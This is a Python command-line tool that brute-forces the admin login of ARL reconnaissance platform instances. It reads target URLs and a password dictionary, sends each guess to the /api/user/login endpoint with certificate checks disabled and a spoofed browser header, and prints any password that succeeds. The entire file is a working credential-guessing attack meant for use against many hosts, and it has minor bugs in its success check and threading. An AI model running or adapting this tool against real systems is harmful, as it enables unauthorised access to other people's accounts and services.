import requests
import urllib3
urllib3.disable_warnings()
import argparse
import json
import urllib.parse
import threading
import queue


def banners():
    logger("banner",'''
           _____  _        _____              ______             
     /\   |  __ \| |      |  __ \            |  ____|            
    /  \  | |__) | |      | |__) |_ _ ___ ___| |__ _   _ ________
   / /\ \ |  _  /| |      |  ___/ _` / __/ __|  __| | | |_  /_  /
  / ____ \| | \ \| |____  | |  | (_| \__ \__ \ |  | |_| |/ / / / 
 /_/    \_\_|  \_\______| |_|   \__,_|___/___/_|   \__,_/___/___|
                      ______                                     
                     |______|                                    
                                by: iak3ec
                                https://github.com/nu0l
''')


def arg():
    parser = argparse.ArgumentParser(usage="python3 arl_pass.py [options]", add_help=False)
    RePOC = parser.add_argument_group("Help","How to use")
    RePOC.add_argument("-u", "--url", dest="url", type=str, help="Target URL (e.g. http://example.com)")
    RePOC.add_argument("-f", "--file", dest="file", help="Select a target list url file (e.g. file.txt)")
    RePOC.add_argument("-p", "--pass", dest="passwd", help="Select a password dictionary file (e.g. pass.txt)")
    RePOC.add_argument("-h", "--help", action="help", help="Show help message and exit")
    return parser.parse_args()


def logger(log="green", text=""):
    if log == "green": #绿
        print("\033[92m{}\033[0m".format(text))
    if log == "red": #红
        print("\033[91m{}\033[0m".format(text))
    if log == "white": #白 
        print("\033[37m{}\033[0m".format(text))
    if log == "yellow": #黄
        print("\033[33m{}\033[0m".format(text))
    if log == "banner": #logo
        print("\033[1;36m{}\033[0m".format(text))


def headers():
    headers = {
        'User-Agent' : 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:91.0) Gecko/20100101 Firefox/91.0',
        'Accept' : 'application/json, text/plain, */*',
        'Content-Type' : 'application/json; charset=UTF-8'
    }
    return headers


def arl(url):
    while not q.empty():
        url = urllib.parse.urljoin(url,'/api/user/login')
        data = {
            "username" : "admin",
            "password" : q.get()
        }
        '''proxies = {
        'http' : 'http://127.0.0.1:8080',
        'https' : 'https://127.0.0.1:8080'
    }'''
        try:
            req = requests.post(url,data=json.dumps(data),headers=headers(),verify=False,timeout=10,allow_redirects=False,proxies=None)
            global return_code
            return_code = req.text
        except Exception as e:
            logger("yellow",e)
            exit()


def thread(num,url):
    for x in range(int(num)):
        t = threading.Thread(target=arl,args=(url,))
        t.start(),t.join() #unjoin
    

def main():
    args = arg()
    if args.url:
        logger('green',('Start ' + args.url))
        for line_pass in open(args.passwd):
            line_pass = line_pass.strip()
            line_pass = line_pass.strip("\r\n")
            if line_pass == "":
                continue 
            q.put(line_pass)
            thread(5,args.url) #自定义线程数量
            global return_code
            if ("admin" and "200") in return_code:
                logger('red',('[*] ' + args.url ))
                logger('red',('[+] Find PassWord: ' + line_pass))
                break
            

    if args.file:
        for line_url in open(args.file):
            line_url = line_url.strip()
            line_url = line_url.strip("\r\n")
            if line_url == "":
                continue
            logger('green',('Start ' + line_url))
            for line_pass in open(args.passwd):
                line_pass = line_pass.strip()
                line_pass = line_pass.strip("\r\n")
                if line_pass == "":
                    continue
                q.put(line_pass)
                thread(5,line_url)
                if ("admin" and "200") in return_code:
                    logger('rea',('[*] ' + line_url))
                    logger('red',('[+] Find PassWord: ' + line_pass))
                    break 


if __name__ == '__main__':
    banners()
    q = queue.Queue()
    return_code = ''
    arg()
    main()